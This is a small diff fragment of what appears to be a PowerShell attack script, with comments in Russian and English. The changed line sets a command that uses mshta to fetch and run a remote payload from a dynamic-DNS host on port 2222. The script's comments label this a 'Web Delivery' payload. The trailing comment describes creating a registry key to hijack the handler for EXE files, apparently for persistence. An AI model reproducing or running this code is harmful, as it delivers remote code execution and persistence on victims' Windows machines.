@@ -1,5 +1,5 @@
 #Out Command | Наш пейлоад в моем случае вектор Web Delivery
-$command = "mshta http://vcrypte.ddns.net:2222/c65A3"
+$command = "mshta http://vcrypte.ddns.net:2222/ZUcPZ"
 
 
 #Create Registry KEY | Создаем ключ в реестре для асоциации бинарных файлов и прописываем действие обработчику EXE файлов:
